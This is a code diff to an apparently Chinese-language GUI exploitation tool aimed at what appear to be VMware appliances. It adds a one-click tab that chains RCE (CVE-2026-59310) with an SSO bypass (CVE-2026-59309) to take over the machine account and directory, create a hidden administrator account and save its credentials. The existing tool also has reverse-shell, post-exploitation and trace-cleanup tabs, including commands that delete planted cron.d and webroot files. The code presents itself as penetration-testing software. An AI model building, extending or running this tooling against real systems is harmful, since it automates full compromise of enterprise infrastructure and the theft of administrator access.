@@ -105,6 +105,7 @@ class ToolApp:
                         ("<F4>", self._k_f4),
                         ("<F5>", lambda e: self._scan_all()),
                         ("<F6>", self._k_f6),
+                        ("<F7>", self._k_f7),
                         ("<Escape>", lambda e: self.stop_flag.set()),
                         ("<Control-l>", lambda e: self._log_clear()),
                         ("<Control-s>", lambda e: self._log_save())):
@@ -191,13 +192,14 @@ class ToolApp:
         self.nb = ttk.Notebook(self.root)
         self.nb.pack(fill="both", expand=True, padx=10, pady=(8, 0))
         tabs = []
-        for _ in range(7):
+        for _ in range(8):
             tabs.append(ttk.Frame(self.nb))
         self.tab_target, self.tab_59310, self.tab_59309, self.tab_shell, \
-            self.tab_postex, self.tab_clean, self.tab_detect = tabs
+            self.tab_postex, self.tab_clean, self.tab_detect, self.tab_chain = tabs
         for w, name in zip(tabs, (" ① 目标与指纹 ", " ② CVE-2026-59310 利用 ",
                                   " ③ CVE-2026-59309 利用 ", " ④ C2 / 反弹 Shell ",
-                                  " ⑤ 后渗透 ", " ⑥ 清理中心 ", " ⑦ 检测与加固 ")):
+                                  " ⑤ 后渗透 ", " ⑥ 清理中心 ", " ⑦ 检测与加固 ",
+                                  " ⑧ 一键打通 ")):
             self.nb.add(w, text=name)
 
         self.cur_target = tk.StringVar()
@@ -210,6 +212,7 @@ class ToolApp:
         self._build_tab_postex()
         self._build_tab_clean()
         self._build_tab_detect()
+        self._build_tab_chain()
 
         logf = ttk.Frame(self.root)
         logf.pack(fill="both", side="bottom", padx=10, pady=(6, 8))
@@ -318,6 +321,10 @@ class ToolApp:
     def _k_f6(self, _e):
         self.nb.select(self.tab_clean)
         self._clean_gen()
+
+    def _k_f7(self, _e):
+        self.nb.select(self.tab_chain)
+        self._chain_run()
 
     def run_bg(self, fn, name="任务"):
         def wrap():
@@ -1517,6 +1524,119 @@ class ToolApp:
                         "rm -f /opt/vmware/share/htdocs/r%s.txt "
                         "/etc/cron.d/cve59310%s*" % (tag, tag))
         self.run_bg(work, "后渗透")
+
+    # ================= Tab8 一键打通 =================
+    def _build_tab_chain(self):
+        f = self.tab_chain
+        f.columnconfigure(0, weight=1)
+        f.columnconfigure(1, weight=1)
+        f.rowconfigure(1, weight=1)
+        _bar, tv = self._target_bar(f)
+        self.vch_host = tv
+
+        left = ttk.Frame(f)
+        left.grid(row=1, column=0, sticky="nsew", padx=(0, 6))
+        right = ttk.Frame(f)
+        right.grid(row=1, column=1, sticky="nsew", padx=(6, 0))
+
+        pf = ttk.LabelFrame(left, text="交付账户（新建管理员）")
+        pf.pack(fill="x", pady=4)
+        ttk.Label(pf, text="用户名").grid(row=0, column=0, padx=4, sticky="w")
+        self.vch_user = tk.StringVar(value="pentest_" + rand_name(4))
+        ttk.Entry(pf, textvariable=self.vch_user, width=15).grid(
+            row=0, column=1, sticky="ew")
+        ttk.Label(pf, text="密码").grid(row=1, column=0, padx=4, sticky="w")
+        self.vch_pass = tk.StringVar(value=rand_name(10) + "!Aa1" + rand_name(2))
+        ttk.Entry(pf, textvariable=self.vch_pass, width=15).grid(
+            row=1, column=1, sticky="ew")
+        ttk.Button(pf, text="↻ 重新随机", width=12,
+                   command=lambda: (self.vch_user.set("pentest_" + rand_name(4)),
+                                    self.vch_pass.set(rand_name(10) + "!Aa1"
+                                                      + rand_name(2)))).grid(
+            row=2, column=0, columnspan=2, sticky="we", padx=4, pady=2)
+        pf.columnconfigure(1, weight=1)
+
+        cf = ttk.LabelFrame(left, text="路径开关")
+        cf.pack(fill="x", pady=4)
+        self.vch_use10 = tk.BooleanVar(value=True)
+        self.vch_use09 = tk.BooleanVar(value=True)
+        ttk.Checkbutton(cf, text="路径 A：59310 RCE → 机器账户接管（首选）",
+                        variable=self.vch_use10).pack(anchor="w", padx=6, pady=2)
+        ttk.Checkbutton(cf, text="路径 B：59309 SRP 绕过（A 失败时降级）",
+                        variable=self.vch_use09).pack(anchor="w", padx=6, pady=2)
+        ttk.Label(cf, text="SSO 域名自动从机器账户 DN 推导；59310 传输参数取自 ② 页。",
+                  style="Muted.TLabel", wraplength=int(500 * self.S),
+                  justify="left").pack(anchor="w", padx=6, pady=2)
+
+        bf = ttk.LabelFrame(left, text="执行")
+        bf.pack(fill="x", pady=4)
+        ttk.Button(bf, text="开始一键打通 [F7]", style="Acc.TButton",
+                   command=self._chain_run).pack(fill="x", padx=4, pady=4)
+        ttk.Button(bf, text="取消", command=self.stop_flag.set).pack(
+            fill="x", padx=4, pady=2)
+        nf = ttk.LabelFrame(left, text="流程")
+        nf.pack(fill="both", expand=True, pady=4)
+        ttk.Label(nf, text="S0 指纹 → S1 59310 RCE → S2 机器账户+SSO 域 →\n"
+                           "S3 目录接管（机器账户 bind → 59309 降级）→\n"
+                           "S4 新建管理员+入组 → S5 bind 回验+组成员确认 →\n"
+                           "S6 交付卡片+自动登记清理。\n\n"
+                           "安全边界：交付账户即终点，不做后续动作与持久化。",
+                  style="Muted.TLabel", wraplength=int(500 * self.S),
+                  justify="left").pack(anchor="w", padx=6, pady=4)
+
+        rf = ttk.LabelFrame(right, text="交付卡片")
+        rf.pack(fill="both", expand=True, pady=4)
+        self.vch_out = tk.Text(rf, bg=COLORS["logbg"], fg=COLORS["fg"],
+                               relief="flat", highlightthickness=1,
+                               highlightbackground=COLORS["border"],
+                               highlightcolor=COLORS["border"],
+                               font=(self.font_family, 9))
+        self.vch_out.pack(fill="both", expand=True, padx=4, pady=4)
+        self.vch_out.insert("1.0", "（尚未执行）\n\n填入目标 IP 后点击「开始一键打通」。\n"
+                                   "典型耗时 2-4 分钟（crond 分钟粒度，2-3 次 RCE）。\n"
+                                   "完成后此处显示可登录 /ui 的管理员账户。")
+
+    def _chain_run(self):
+        from .chain import run_chain
+        host = self.vch_host.get().strip().split(":")[0]
+        if not host:
+            messagebox.showwarning("提示", "需要目标")
+            return
+        user = self.vch_user.get().strip() or None
+        password = self.vch_pass.get().strip() or None
+        use10, use09 = self.vch_use10.get(), self.vch_use09.get()
+        try:
+            vport = int(self.v510_vport.get() or 5480)
+            port = int(self.v510_port.get() or 514)
+        except ValueError:
+            messagebox.showwarning("提示", "② 页端口设置需为数字")
+            return
+        proxy = self.http_proxy.get().strip() or None
+        self.stop_flag.clear()
+        self.log("[*] 一键打通开始 → %s（路径A=%s 路径B=%s）"
+                 % (host, use10, use09), "i")
+
+        def work():
+            r = run_chain(host, user=user, password=password,
+                          use_59310=use10, use_59309=use09,
+                          syslog_port=port, proto=self.v510_proto.get().lower(),
+                          vami_port=vport, proxy=proxy,
+                          log=lambda s: self.log(s, "m"),
+                          stop_flag=self.stop_flag)
+            card = r.card
+
+            def _show():
+                self.vch_out.delete("1.0", "end")
+                self.vch_out.insert("1.0", card)
+            self.root.after(0, _show)
+            if r.ok:
+                self.record("chain-管理员账户", host, r.upn,
+                            "ldapdelete '%s'" % r.udn)
+                self.creds["SSO管理员@%s" % host] = "%s / %s" % (r.upn, r.password)
+                self.log("[+] 一键打通完成（%s）" % r.via, "+")
+            else:
+                self.log("[!] 一键打通未成功，各阶段明细见上方与日志", "!")
+        self.run_bg(work, "一键打通")
 
     # ================= Tab6 清理中心 =================
     def _build_tab_clean(self):
